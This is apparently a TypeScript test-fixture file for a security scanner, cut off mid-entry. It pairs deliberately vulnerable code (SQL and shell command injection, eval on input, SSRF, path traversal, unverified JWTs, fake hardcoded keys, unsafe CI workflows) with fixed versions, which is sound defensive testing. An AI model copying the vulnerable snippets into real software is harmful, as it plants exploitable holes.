import type { CodeFile } from '../../lib/scanner-engine';

/**
 * Rule fixture table. Every case pairs a vulnerable fixture (`detects`) with the fixed
 * version of the same code (`ignores`). All `ruleIds` must fire on the first and none on
 * the second. Add a row when adding or fixing a rule.
 */
export interface RuleCase {
  ruleIds: number[];
  name: string;
  detects: CodeFile[];
  ignores: CodeFile[];
}

/**
 * Known scanner gaps, run as `todo` tests: they report but never fail CI.
 * When a fix makes one pass, move it into RULE_CASES.
 */
export interface KnownGap {
  ruleId: number | null;
  name: string;
  kind: 'false-positive' | 'false-negative';
  files: CodeFile[];
}

const f = (path: string, content: string): CodeFile[] => [{ path, content }];

// Fake credentials are assembled at runtime so secret scanners don't flag this file
const FAKE_STRIPE_LIVE = ['sk', 'live', '51HqLyjWDarjtT1zdp7dcXYZabcdEFGHijklMNOP'].join('_');
const FAKE_AWS_KEY = 'AKIA' + '2E0A8F3B244C9986';
const FAKE_GITHUB_PAT = 'ghp' + '_R4nd0mT0k3nV4lu3F0rT3st1ngPurp0s3sAb';

export const RULE_CASES: RuleCase[] = [
  // ─── Secrets ──────────────────────────────────────────────────────────
  {
    ruleIds: [1],
    name: 'Hardcoded API secret',
    detects: f('src/lib/openai.ts', 'export const key = "sk-proj-abcdefghijklmnopqrstuvwxyz123456";\n'),
    ignores: f('src/lib/openai.ts', 'export const key = process.env.OPENAI_API_KEY;\n')
  },
  {
    ruleIds: [1, 5010],
    name: 'Hardcoded Stripe live key',
    detects: f('lib/stripe.ts', `export const stripeKey = '${FAKE_STRIPE_LIVE}';\n`),
    ignores: f('lib/stripe.ts', 'export const stripeKey = process.env.STRIPE_SECRET_KEY;\n')
  },
  {
    ruleIds: [5001],
    name: 'Hardcoded AWS access key',
    detects: f('config/aws.ts', `export const aws = { accessKeyId: '${FAKE_AWS_KEY}' };\n`),
    ignores: f('config/aws.ts', 'export const aws = { accessKeyId: process.env.AWS_ACCESS_KEY_ID };\n')
  },
  {
    ruleIds: [5003],
    name: 'Hardcoded GitHub personal access token',
    detects: f('scripts/release.ts', `const token = '${FAKE_GITHUB_PAT}';\n`),
    ignores: f('scripts/release.ts', 'const token = process.env.GITHUB_TOKEN;\n')
  },
  {
    ruleIds: [5045],
    name: 'Private key block in source',
    detects: f('certs/key.ts', 'export const k = `-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA7\n-----END RSA PRIVATE KEY-----`;\n'),
    ignores: f('certs/key.ts', 'export const k = process.env.SIGNING_PRIVATE_KEY;\n')
  },
  {
    ruleIds: [36],
    name: 'Backend secret exposed via NEXT_PUBLIC_',
    detects: f('components/Pay.tsx', "'use client';\nconst key = process.env.NEXT_PUBLIC_STRIPE_SECRET_KEY;\nexport default function Pay() { return <div>{key}</div>; }\n"),
    ignores: f('lib/supabase-admin.ts', "import 'server-only';\nimport { createClient } from '@supabase/supabase-js';\nexport const admin = createClient(process.env.NEXT_PUBLIC_SUPABASE_URL!, process.env.SUPABASE_SERVICE_ROLE_KEY!);\n")
  },

  // ─── Database ─────────────────────────────────────────────────────────
  {
    ruleIds: [3],
    name: 'Permissive Supabase RLS policy',
    detects: f('supabase/migrations/001.sql', 'CREATE POLICY "all" ON profiles FOR ALL USING (true);\n'),
    ignores: f('supabase/migrations/001.sql', 'CREATE POLICY "own" ON profiles FOR SELECT USING (auth.uid() = user_id);\n')
  },
  {
    ruleIds: [3001, 6010],
    name: 'Table without Row Level Security',
    detects: f('supabase/migrations/002.sql', 'CREATE TABLE public.payments (id uuid primary key, user_id uuid, amount int);\n'),
    ignores: f('supabase/migrations/002.sql', 'CREATE TABLE public.payments (id uuid primary key, user_id uuid, amount int);\nALTER TABLE public.payments ENABLE ROW LEVEL SECURITY;\nCREATE POLICY "own" ON public.payments FOR SELECT USING (auth.uid() = user_id);\n')
  },
  {
    ruleIds: [3001],
    name: 'Supabase table without RLS (RLS enabled in a later migration counts)',
    detects: [
      { path: 'supabase/migrations/20240101_init.sql', content: 'CREATE TABLE public.invoices (id uuid primary key, user_id uuid);\n' },
      { path: 'supabase/config.toml', content: 'project_id = "demo"\n' }
    ],
    ignores: [
      { path: 'supabase/migrations/20240101_init.sql', content: 'CREATE TABLE public.invoices (id uuid primary key, user_id uuid);\n' },
      { path: 'supabase/migrations/20240201_rls.sql', content: 'ALTER TABLE public.invoices ENABLE ROW LEVEL SECURITY;\n' },
      { path: 'supabase/config.toml', content: 'project_id = "demo"\n' }
    ]
  },
  {
    ruleIds: [3021, 6043],
    name: 'SQL injection via template literal',
    detects: f('app/api/users/route.ts', "import { db } from '@/lib/db';\nexport async function GET(req: Request) {\n  const id = new URL(req.url).searchParams.get('id');\n  const rows = await db.query(`SELECT * FROM users WHERE id = ${id}`);\n  return Response.json(rows);\n}\n"),
    ignores: f('app/api/users/route.ts', "import { db } from '@/lib/db';\nexport async function GET(req: Request) {\n  const id = new URL(req.url).searchParams.get('id');\n  const rows = await db.query('SELECT * FROM users WHERE id = $1', [id]);\n  return Response.json(rows);\n}\n")
  },

  {
    ruleIds: [6051],
    name: 'Migration that locks an existing table',
    detects: f('supabase/migrations/003.sql', 'ALTER TABLE orders ADD COLUMN region text NOT NULL;\nCREATE INDEX idx_orders_user ON orders(user_id);\n'),
    ignores: f('supabase/migrations/003.sql', "ALTER TABLE orders ADD COLUMN region text NOT NULL DEFAULT 'eu';\nCREATE INDEX CONCURRENTLY idx_orders_user ON orders(user_id);\nCREATE TABLE refunds (id uuid primary key, order_id uuid);\nCREATE INDEX idx_refunds_order ON refunds(order_id);\n")
  },
  {
    ruleIds: [9106],
    name: 'IDOR: service-role lookup by request id',
    detects: f('app/api/invoices/[id]/route.ts', "import { createClient } from '@supabase/supabase-js';\nconst admin = createClient(process.env.SUPABASE_URL!, process.env.SUPABASE_SERVICE_ROLE_KEY!);\nexport async function GET(req: Request, { params }: { params: { id: string } }) {\n  const { data } = await admin.from('invoices').select('*').eq('id', params.id).single();\n  return Response.json(data);\n}\n"),
    ignores: f('app/api/invoices/[id]/route.ts', "import { createClient } from '@supabase/supabase-js';\nconst admin = createClient(process.env.SUPABASE_URL!, process.env.SUPABASE_SERVICE_ROLE_KEY!);\nexport async function GET(req: Request, { params }: { params: { id: string } }) {\n  const { data: { user } } = await admin.auth.getUser(req.headers.get('authorization') ?? '');\n  if (!user) return new Response('unauthorized', { status: 401 });\n  const { data } = await admin.from('invoices').select('*').eq('id', params.id).eq('user_id', user.id).single();\n  return Response.json(data);\n}\n")
  },

  // ─── Injection & web ──────────────────────────────────────────────────
  {
    ruleIds: [32],
    name: 'eval on user input',
    detects: f('lib/calc.ts', 'export function calc(input: string) {\n  return eval(input);\n}\n'),
    ignores: f('lib/calc.ts', 'export function calc(input: string) {\n  return JSON.parse(input);\n}\n')
  },
  {
    ruleIds: [33, 13602],
    name: 'Command injection via shell exec',
    detects: f('app/api/ping/route.ts', "import { exec } from 'child_process';\nexport async function GET(req: Request) {\n  const host = new URL(req.url).searchParams.get('host');\n  exec(`ping -c 1 ${host}`);\n  return new Response('ok');\n}\n"),
    ignores: f('app/api/ping/route.ts', "import { execFile } from 'child_process';\nexport async function GET(req: Request) {\n  const host = new URL(req.url).searchParams.get('host') ?? '';\n  if (!/^[a-z0-9.-]+$/i.test(host)) return new Response('bad', { status: 400 });\n  execFile('ping', ['-c', '1', host]);\n  return new Response('ok');\n}\n")
  },
  {
    ruleIds: [34],
    name: 'SSRF via user-controlled fetch URL',
    detects: f('app/api/fetch/route.ts', "export async function GET(req: Request) {\n  const url = new URL(req.url).searchParams.get('url')!;\n  const r = await fetch(url);\n  return new Response(await r.text());\n}\n"),
    ignores: f('app/api/fetch/route.ts', "const ALLOWED = new Set(['api.github.com']);\nexport async function GET(req: Request) {\n  const target = new URL(new URL(req.url).searchParams.get('url')!);\n  if (!ALLOWED.has(target.hostname)) return new Response('forbidden', { status: 403 });\n  const r = await fetch(target, { signal: AbortSignal.timeout(5000) });\n  return new Response(await r.text());\n}\n")
  },
  {
    ruleIds: [8],
    name: 'Wildcard CORS origin',
    detects: f('server/app.ts', "app.use(cors({ origin: '*' }));\n"),
    ignores: f('server/app.ts', 'app.use(cors({ origin: process.env.PRODUCTION_CLIENT_URL }));\n')
  },
  {
    ruleIds: [41],
    name: 'Open redirect to user-supplied URL',
    detects: f('app/api/redirect/route.ts', "import { redirect } from 'next/navigation';\nexport async function GET(req: Request) {\n  const next = new URL(req.url).searchParams.get('next')!;\n  redirect(next);\n}\n"),
    ignores: f('app/api/redirect/route.ts', "import { redirect } from 'next/navigation';\nexport async function GET(req: Request) {\n  const next = new URL(req.url).searchParams.get('next') ?? '/';\n  redirect(next.startsWith('/') && !next.startsWith('//') ? next : '/');\n}\n")
  },
  {
    ruleIds: [16],
    name: 'Unsanitized innerHTML',
    detects: f('components/Post.tsx', 'export const Post = ({ html }: { html: string }) => <div dangerouslySetInnerHTML={{ __html: html }} />;\n'),
    ignores: f('app/layout.tsx', 'const ld = { "@context": "https://schema.org" };\nexport const Ld = () => <script type="application/ld+json" dangerouslySetInnerHTML={{ __html: JSON.stringify(ld) }} />;\n')
  },

  // ─── Auth & crypto ────────────────────────────────────────────────────
  {
    ruleIds: [39],
    name: 'JWT decoded without verification',
    detects: f('middleware.ts', "import jwt from 'jsonwebtoken';\nexport function middleware(req: any) {\n  const user = jwt.decode(req.cookies.get('token').value);\n  if (user) return;\n}\n"),
    ignores: f('middleware.ts', "import jwt from 'jsonwebtoken';\nexport function middleware(req: any) {\n  const user = jwt.verify(req.cookies.get('token').value, process.env.JWT_SECRET!, { algorithms: ['HS256'] });\n  if (user) return;\n}\n")
  },
  {
    ruleIds: [28],
    name: "JWT verify accepting alg 'none'",
    detects: f('lib/auth.ts', "import jwt from 'jsonwebtoken';\nexport const verify = (t: string) => jwt.verify(t, process.env.JWT_SECRET!, { algorithms: ['none'] });\n"),
    ignores: f('lib/auth.ts', "import jwt from 'jsonwebtoken';\nexport const verify = (t: string) => jwt.verify(t, process.env.JWT_SECRET!, { algorithms: ['HS256'] });\n")
  },
  {
    ruleIds: [37],
    name: 'MD5 password hashing',
    detects: f('lib/hash.ts', "import crypto from 'crypto';\nexport const hashPassword = (p: string) => crypto.createHash('md5').update(p).digest('hex');\n"),
    ignores: f('lib/hash.ts', "import crypto from 'crypto';\nexport const hashPassword = (p: string, salt: Buffer) => crypto.scryptSync(p, salt, 64).toString('hex');\n")
  },
  {
    ruleIds: [38],
    name: 'Math.random for security tokens',
    detects: f('lib/token.ts', 'export const resetToken = () => Math.random().toString(36).slice(2);\n'),
    ignores: f('lib/token.ts', "import crypto from 'crypto';\nexport const resetToken = () => crypto.randomBytes(32).toString('hex');\n")
  },

  // ─── Payments ─────────────────────────────────────────────────────────
  {
    ruleIds: [9704, 8143],
    name: 'Payment webhook without signature verification',
    detects: f('app/api/stripe/webhook/route.ts', "export async function POST(req: Request) {\n  const event = await req.json();\n  if (event.type === 'checkout.session.completed') { await grantPro(event.data.object.customer); }\n  return new Response('ok');\n}\n"),
    ignores: f('app/api/stripe/webhook/route.ts', "import Stripe from 'stripe';\nconst stripe = new Stripe(process.env.STRIPE_SECRET_KEY!);\nexport async function POST(req: Request) {\n  const sig = req.headers.get('stripe-signature')!;\n  const event = stripe.webhooks.constructEvent(await req.text(), sig, process.env.STRIPE_WEBHOOK_SECRET!);\n  if (event.type === 'checkout.session.completed') { await grantPro(event.data.object); }\n  return new Response('ok');\n}\n")
  },

  // ─── LLM cost ─────────────────────────────────────────────────────────
  {
    ruleIds: [141, 4001, 8071],
    name: 'LLM call without max_tokens',
    detects: f('app/api/chat/route.ts', "import OpenAI from 'openai';\nconst openai = new OpenAI();\nexport async function POST(req: Request) {\n  const { prompt } = await req.json();\n  const r = await openai.chat.completions.create({ model: 'gpt-4o', messages: [{ role: 'user', content: prompt }] });\n  return Response.json(r);\n}\n"),
    ignores: f('app/api/chat/route.ts', "import OpenAI from 'openai';\nconst openai = new OpenAI();\nexport async function POST(req: Request) {\n  const { prompt } = await req.json();\n  const r = await openai.chat.completions.create({ model: 'gpt-4o', max_tokens: 512, messages: [{ role: 'user', content: String(prompt).slice(0, 4000) }] });\n  return Response.json(r);\n}\n")
  },

  {
    ruleIds: [10402],
    name: 'AI endpoint without rate limiting',
    detects: f('app/api/chat/route.ts', "import OpenAI from 'openai';\nconst openai = new OpenAI();\nexport async function POST(req: Request) {\n  const { prompt } = await req.json();\n  return Response.json(await openai.chat.completions.create({ model: 'gpt-4o', max_tokens: 256, messages: [{ role: 'user', content: prompt }] }));\n}\n"),
    ignores: [
      { path: 'app/api/chat/route.ts', content: "import OpenAI from 'openai';\nimport { rateLimit } from '@/lib/rate-limit';\nconst openai = new OpenAI();\nexport async function POST(req: Request) {\n  await rateLimit(req);\n  const { prompt } = await req.json();\n  return Response.json(await openai.chat.completions.create({ model: 'gpt-4o', max_tokens: 256, messages: [{ role: 'user', content: prompt }] }));\n}\n" },
      { path: 'app/api/login/route.ts', content: "export async function POST(req: Request) {\n  const body = await req.json();\n  return Response.json({ ok: Boolean(body.email) });\n}\n" }
    ]
  },

  // ─── Logging ──────────────────────────────────────────────────────────
  {
    ruleIds: [21, 8201, 12101],
    name: 'Credentials written to logs',
    detects: f('app/api/login/route.ts', "export async function POST(req: Request) {\n  const body = await req.json();\n  console.log('login attempt', body.password, req.headers.get('authorization'));\n  return new Response('ok');\n}\n"),
    ignores: f('app/api/login/route.ts', "export async function POST(req: Request) {\n  const body = await req.json();\n  console.info('login attempt', { email: hashEmail(body.email) });\n  return new Response('ok');\n}\n")
  },

  // ─── SaaS core (SAAS-01..08) ──────────────────────────────────────────
  {
    ruleIds: [23001],
    name: 'RLS policy open to every signed-in user',
    detects: f('supabase/migrations/010.sql', 'CREATE POLICY "read" ON public.invoices FOR SELECT TO authenticated USING (auth.uid() IS NOT NULL);\n'),
    ignores: f('supabase/migrations/010.sql', 'CREATE POLICY "read" ON public.invoices FOR SELECT TO authenticated USING (auth.uid() = user_id);\n')
  },
  {
    ruleIds: [23002],
    name: 'Supabase getSession() used for server authorization',
    detects: f('app/api/projects/route.ts', "export async function GET() {\n  const supabase = await createClient();\n  const { data: { session } } = await supabase.auth.getSession();\n  if (!session) return new Response('unauthorized', { status: 401 });\n  return Response.json(await listProjects(session.user.id));\n}\n"),
    ignores: [
      { path: 'app/api/projects/route.ts', content: "export async function GET() {\n  const supabase = await createClient();\n  const { data: { user } } = await supabase.auth.getUser();\n  if (!user) return new Response('unauthorized', { status: 401 });\n  return Response.json(await listProjects(user.id));\n}\n" },
      { path: 'components/AuthButton.tsx', content: "'use client';\nexport function AuthButton() {\n  useEffect(() => { supabase.auth.getSession().then(({ data }) => setSession(data.session)); }, []);\n  return null;\n}\n" }
    ]
  },
  {
    ruleIds: [23003],
    name: 'SECURITY DEFINER function without search_path',
    detects: f('supabase/migrations/011.sql', "CREATE OR REPLACE FUNCTION public.is_admin()\nRETURNS boolean\nLANGUAGE sql\nSECURITY DEFINER\nAS $$\n  SELECT EXISTS (SELECT 1 FROM profiles WHERE id = auth.uid() AND role = 'admin');\n$$;\n"),
    ignores: f('supabase/migrations/011.sql', "CREATE OR REPLACE FUNCTION public.is_admin()\nRETURNS boolean\nLANGUAGE sql\nSECURITY DEFINER\nSET search_path = ''\nAS $$\n  SELECT EXISTS (SELECT 1 FROM public.profiles WHERE id = auth.uid() AND role = 'admin');\n$$;\n")
  },
  {
    ruleIds: [23003],
    name: 'SECURITY DEFINER fixed by a later migration (cross-file)',
    detects: f('supabase/migrations/20260101_quota.sql', "CREATE OR REPLACE FUNCTION public.reserve_quota(p_user uuid)\nRETURNS void\nLANGUAGE plpgsql\nSECURITY DEFINER\nAS $$\nBEGIN\n  UPDATE public.subscriptions SET used = used + 1 WHERE user_id = p_user;\nEND;\n$$;\n"),
    ignores: [
      { path: 'supabase/migrations/20260101_quota.sql', content: "CREATE OR REPLACE FUNCTION public.reserve_quota(p_user uuid)\nRETURNS void\nLANGUAGE plpgsql\nSECURITY DEFINER\nAS $$\nBEGIN\n  UPDATE public.subscriptions SET used = used + 1 WHERE user_id = p_user;\nEND;\n$$;\n" },
      { path: 'supabase/migrations/20260301_harden.sql', content: "ALTER FUNCTION public.reserve_quota(uuid) SET search_path = '';\n" }
    ]
  },
  {
    ruleIds: [23004],
    name: 'Checkout price chosen by the client',
    detects: f('app/api/checkout/route.ts', "export async function POST(req: Request) {\n  const { priceId } = await req.json();\n  const session = await stripe.checkout.sessions.create({ mode: 'subscription', line_items: [{ price: priceId, quantity: 1 }] });\n  return Response.json({ url: session.url });\n}\n"),
    ignores: f('app/api/checkout/route.ts', "const PRICES = { pro: process.env.STRIPE_PRICE_PRO!, team: process.env.STRIPE_PRICE_TEAM! };\nexport async function POST(req: Request) {\n  const { plan } = await req.json();\n  const price = PRICES[plan as keyof typeof PRICES];\n  if (!price) return new Response('bad plan', { status: 400 });\n  const session = await stripe.checkout.sessions.create({ mode: 'subscription', line_items: [{ price, quantity: 1 }] });\n  return Response.json({ url: session.url });\n}\n")
  },
  {
    ruleIds: [23005],
    name: 'Secret compared with !==',
    detects: f('app/api/admin/route.ts', "export async function POST(req: Request) {\n  if (req.headers.get('x-api-key') !== process.env.ADMIN_API_KEY) return new Response('no', { status: 401 });\n  return new Response('ok');\n}\n"),
    ignores: f('app/api/admin/route.ts', "import { timingSafeEqual } from 'crypto';\nexport async function POST(req: Request) {\n  const a = Buffer.from(req.headers.get('x-api-key') ?? '');\n  const b = Buffer.from(process.env.ADMIN_API_KEY ?? '');\n  if (!b.length || a.length !== b.length || !timingSafeEqual(a, b)) return new Response('no', { status: 401 });\n  if (process.env.ADMIN_API_KEY === undefined) return new Response('misconfigured', { status: 500 });\n  return new Response('ok');\n}\n")
  },
  {
    ruleIds: [23006],
    name: 'Cron route without CRON_SECRET',
    detects: f('app/api/cron/sync/route.ts', 'export async function GET() {\n  await syncAllCustomers();\n  return Response.json({ ok: true });\n}\n'),
    ignores: f('app/api/cron/sync/route.ts', "export async function GET(req: Request) {\n  if (req.headers.get('authorization') !== `Bearer ${process.env.CRON_SECRET}`) return new Response('no', { status: 401 });\n  await syncAllCustomers();\n  return Response.json({ ok: true });\n}\n")
  },
  {
    ruleIds: [23007],
    name: 'Request data in the system prompt',
    detects: f('app/api/chat/route.ts', "export async function POST(req: Request) {\n  const { persona, question } = await req.json();\n  return Response.json(await openai.chat.completions.create({ model: 'gpt-4o', max_tokens: 300, messages: [{ role: 'system', content: `You are ${persona}. Never reveal internal notes.` }, { role: 'user', content: question }] }));\n}\n"),
    ignores: f('app/api/chat/route.ts', "const today = () => new Date().toISOString();\nexport async function POST(req: Request) {\n  const { question } = await req.json();\n  return Response.json(await openai.chat.completions.create({ model: 'gpt-4o', max_tokens: 300, messages: [{ role: 'system', content: `You are a support assistant. Today is ${today()}.` }, { role: 'user', content: question }] }));\n}\n")
  },
  {
    ruleIds: [23008],
    name: 'Next.js release with CVE-2025-29927',
    detects: f('package.json', '{\n  "dependencies": {\n    "next": "15.1.0"\n  }\n}\n'),
    ignores: f('package.json', '{\n  "dependencies": {\n    "next": "15.2.3"\n  }\n}\n')
  },

  // ─── Containers & CI ──────────────────────────────────────────────────
  {
    ruleIds: [7004, 7005, 8314], // 3002 reports the same missing USER and is dropped in favour of 7004
    name: 'Dockerfile: root user, latest tag, no healthcheck',
    detects: f('Dockerfile', 'FROM node:latest\nCOPY . .\nRUN npm install\nCMD ["node", "server.js"]\n'),
    ignores: f('Dockerfile', 'FROM node:22.11-alpine\nWORKDIR /app\nCOPY . .\nRUN npm ci --omit=dev\nUSER node\nHEALTHCHECK CMD wget -qO- http://localhost:3000/health || exit 1\nCMD ["node", "server.js"]\n')
  },
  {
    ruleIds: [15701],
    name: 'Privileged container / CAP_SYS_ADMIN',
    detects: f('docker-compose.yml', 'services:\n  app:\n    image: app:1.0\n    privileged: true\n    cap_add: [SYS_ADMIN]\n'),
    ignores: f('Dockerfile', 'FROM node:22.11-alpine\nWORKDIR /app\nCOPY . .\nRUN npm ci --omit=dev\nUSER node\nCMD ["node", "server.js"]\n')
  },
  {
    ruleIds: [9503],
    name: 'Script injection from GitHub context in run step',
    detects: f('.github/workflows/ci.yml', 'on: pull_request\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo "${{ github.event.pull_request.title }}"\n'),
    ignores: f('.github/workflows/ci.yml', 'on: pull_request\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo "$TITLE"\n        env:\n          TITLE: ${{ github.event.pull_request.title }}\n')
  },
  {
    ruleIds: [12605],
    name: 'Unpinned third-party GitHub Action',
    detects: f('.github/workflows/ci.yml', 'on: push\njobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: tj-actions/changed-files@v45\n'),
    ignores: f('.github/workflows/ci.yml', 'on: push\njobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: tj-actions/changed-files@c3a1bb2c992d77180ae65be6ae6c166cf40f857c\n      - uses: actions/checkout@v4\n')
  },
  {
    ruleIds: [14104, 12603],
    name: 'Release pipeline with mutable action tags and no provenance',
    detects: f('.github/workflows/release.yml', 'on:\n  push:\n    tags: ["v*"]\njobs:\n  r:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - run: npm publish\n'),
    ignores: [
      { path: '.github/workflows/release.yml', content: 'on:\n  push:\n    tags: ["v*"]\njobs:\n  r:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683\n      - run: npm publish --provenance\n' },
      { path: '.github/dependabot.yml', content: 'version: 2\nupdates:\n  - package-ecosystem: github-actions\n    directory: /\n    schedule:\n      interval: weekly\n' }
    ]
  },
  {
    ruleIds: [10705],
    name: 'Large uncompressed JSON blob written to cache',
    detects: f('lib/cache.ts', 'export const save = (k: string, v: object) => redis.set(k, JSON.stringify(v));\n'),
    ignores: [
      { path: 'lib/cache.ts', content: "import { gzipSync } from 'zlib';\nexport const save = (k: string, v: object) => redis.set(k, gzipSync(JSON.stringify(v)));\n" },
      { path: 'app/api/x/route.ts', content: 'export const GET = () => new Response(JSON.stringify({ ok: true }));\n' }
    ]
  },
  {
    ruleIds: [7323, 9501, 9502],
    name: 'pull_request_target with untrusted checkout',
    detects: f('.github/workflows/ci.yml', 'on: pull_request_target\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n      - run: npm ci && npm test\n'),
    ignores: f('.github/workflows/ci.yml', 'on: pull_request\npermissions:\n  contents: read\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683\n      - run: npm ci && npm test\n')
  },

  // ─── Calibration batch 1: previously unproven CRITICAL rules ─────────
  {
    ruleIds: [17],
    name: 'Record fetched by URL id without ownership check (BOLA)',
    detects: f('app/api/invoices/[id]/route.ts', "import { prisma } from '@/lib/db';\nexport async function GET(req: Request, { params }: { params: { id: string } }) {\n  const invoice = await prisma.invoice.findUnique({ where: { id: params.id } });\n  return Response.json(invoice);\n}\n"),
    ignores: f('app/api/invoices/[id]/route.ts', "import { prisma } from '@/lib/db';\nimport { auth } from '@/lib/auth';\nexport async function GET(req: Request, { params }: { params: { id: string } }) {\n  const session = await auth();\n  const invoice = await prisma.invoice.findFirst({ where: { id: params.id, ownerId: session.user.id } });\n  return Response.json(invoice);\n}\n")
  },
  {
    ruleIds: [19],
    name: 'LLM agent with destructive tools and no approval step',
    detects: f('lib/agent.ts', "export const run = (prompt: string) => generateText({ model, prompt, tools: [searchDocs, deleteDatabase, sendEmail] });\n"),
    ignores: f('lib/agent.ts', "export const run = (prompt: string) => generateText({ model, prompt, tools: [searchDocs, deleteDatabase, sendEmail], onToolCall: requireApproval });\n")
  },
  {
    ruleIds: [22],
    name: 'LLM SDK used directly in a client component',
    detects: f('components/Chat.tsx', "'use client';\nimport OpenAI from 'openai';\nconst client = new OpenAI({ apiKey: process.env.NEXT_PUBLIC_OPENAI_KEY, dangerouslyAllowBrowser: true });\nexport function Chat() { return null; }\n"),
    ignores: f('components/Chat.tsx', "'use client';\nexport function Chat() {\n  const send = (m: string) => fetch('/api/chat', { method: 'POST', body: m });\n  return <button onClick={() => send('hi')}>Send</button>;\n}\n")
  },
  {
    ruleIds: [24],
    name: 'File read from a user-controlled path',
    detects: f('app/api/files/route.ts', "import { readFile } from 'fs/promises';\nexport async function GET(req: Request) {\n  const { searchParams } = new URL(req.url);\n  const data = await readFile(`./uploads/${searchParams.get('name')}`);\n  return new Response(data);\n}\n"),
    ignores: f('app/api/files/route.ts', "import { readFile } from 'fs/promises';\nimport path from 'path';\nexport async function GET(req: Request) {\n  const { searchParams } = new URL(req.url);\n  const name = path.basename(searchParams.get('name') ?? '');\n  const data = await readFile(path.join('./uploads', name));\n  return new Response(data);\n}\n")
  },
  {
    ruleIds: [31],
    name: 'YAML loader that instantiates arbitrary objects',
    detects: f('app/config.py', 'import yaml\n\ndef load(path):\n    with open(path) as f:\n        return yaml.load(f, Loader=yaml.Loader)\n'),
    ignores: [
      { path: 'app/config.py', content: 'import yaml\n\ndef load(path):\n    with open(path) as f:\n        return yaml.safe_load(f)\n' },
      // js-yaml 4: load() uses the safe default schema
      { path: 'lib/config.ts', content: "import yaml from 'js-yaml';\nexport const parse = (text: string) => yaml.load(text);\n" }
    ]
  },
  {
    ruleIds: [4003],
    name: 'LLM output passed to eval',
    detects: f('lib/agent-run.ts', "export async function run(prompt: string) {\n  const completion = await openai.chat.completions.create({ model: 'gpt-4o', messages: [{ role: 'user', content: prompt }], max_tokens: 500 });\n  return eval(completion.choices[0].message.content ?? '');\n}\n"),
    ignores: f('lib/agent-run.ts', "export async function run(prompt: string) {\n  const completion = await openai.chat.completions.create({ model: 'gpt-4o', messages: [{ role: 'user', content: prompt }], max_tokens: 500 });\n  return JSON.parse(completion.choices[0].message.content ?? '{}');\n}\n")
  },
  {
    ruleIds: [4004],
    name: 'Signed-in user search over all tenants\' embeddings',
    detects: f('app/api/search/route.ts', "import { createClient } from '@/lib/supabase/server';\nexport async function POST(req: Request) {\n  const supabase = await createClient();\n  const { data: { user } } = await supabase.auth.getUser();\n  const { embedding } = await req.json();\n  const { data } = await supabase.rpc('match_documents', { query_embedding: embedding, match_count: 5 });\n  return Response.json(data);\n}\n"),
    ignores: [
      { path: 'app/api/search/route.ts', content: "import { createClient } from '@/lib/supabase/server';\nexport async function POST(req: Request) {\n  const supabase = await createClient();\n  const { data: { user } } = await supabase.auth.getUser();\n  const { embedding } = await req.json();\n  const { data } = await supabase.rpc('match_documents', { query_embedding: embedding, match_count: 5, filter_user_id: user.id });\n  return Response.json(data);\n}\n" },
      { path: 'lib/rag.ts', content: "export async function retrieve(vector: number[], session: Session) {\n  return pc.index('docs').namespace(session.user.id).query({ vector, topK: 5 });\n}\n" },
      // Public docs search without any user context is not multi-tenant
      { path: 'app/api/docs-search/route.ts', content: "export async function POST(req: Request) {\n  const { embedding } = await req.json();\n  const { data } = await supabase.rpc('match_documents', { query_embedding: embedding, match_count: 5 });\n  return Response.json(data);\n}\n" }
    ]
  },
  {
    ruleIds: [4004],
    name: 'Pinecone query without tenant filter',
    detects: f('lib/rag.ts', "export async function retrieve(vector: number[], session: Session) {\n  if (!session.user) throw new Error('unauthenticated');\n  const index = pc.index('docs');\n  return index.query({ vector, topK: 5, includeMetadata: true });\n}\n"),
    ignores: f('lib/rag.ts', "export async function retrieve(vector: number[], session: Session) {\n  const index = pc.index('docs');\n  return index.query({ vector, topK: 5, filter: { userId: session.user.id } });\n}\n")
  },
  {
    ruleIds: [6005],
    name: 'pg Pool created inside the request handler',
    detects: f('app/api/users/route.ts', "import { Pool } from 'pg';\nexport async function GET() {\n  const pool = new Pool({ connectionString: process.env.DATABASE_URL });\n  const { rows } = await pool.query('select id from users');\n  return Response.json(rows);\n}\n"),
    ignores: f('app/api/users/route.ts', "import { Pool } from 'pg';\nconst pool = new Pool({ connectionString: process.env.DATABASE_URL });\nexport async function GET() {\n  const { rows } = await pool.query('select id from users');\n  return Response.json(rows);\n}\n")
  },
  {
    ruleIds: [6009],
    name: 'External HTTP call inside a database transaction',
    detects: f('lib/orders.ts', "export async function place(data: OrderInput) {\n  await prisma.$transaction(async (tx) => {\n    await tx.order.create({ data });\n    await fetch('https://api.shipping.example/label', { method: 'POST' });\n  });\n}\n"),
    ignores: f('lib/orders.ts', "export async function place(data: OrderInput) {\n  await prisma.$transaction(async (tx) => {\n    await tx.order.create({ data });\n  });\n  await fetch('https://api.shipping.example/label', { method: 'POST' });\n}\n")
  },
  {
    ruleIds: [6015],
    name: 'Pooled pg client never released',
    detects: f('lib/report.ts', "export async function report() {\n  const client = await pool.connect();\n  const res = await client.query('select count(*) from orders');\n  return res.rows[0];\n}\n"),
    ignores: f('lib/report.ts', "export async function report() {\n  const client = await pool.connect();\n  try {\n    const res = await client.query('select count(*) from orders');\n    return res.rows[0];\n  } finally {\n    client.release();\n  }\n}\n")
  },
  {
    ruleIds: [6038],
    name: 'Production database URL with password in source',
    detects: f('lib/db.ts', 'export const DATABASE_URL = "postgresql://admin:S3cretPass@db.prod.example.com:5432/app";\n'),
    ignores: f('lib/db.ts', 'export const DATABASE_URL = process.env.DATABASE_URL;\n')
  },
  {
    ruleIds: [7215],
    name: 'GET handler that deletes data',
    detects: f('app/api/unsubscribe/route.ts', "export async function GET(req: Request) {\n  const token = new URL(req.url).searchParams.get('token') ?? '';\n  await prisma.subscription.delete({ where: { token } });\n  return new Response('ok');\n}\n"),
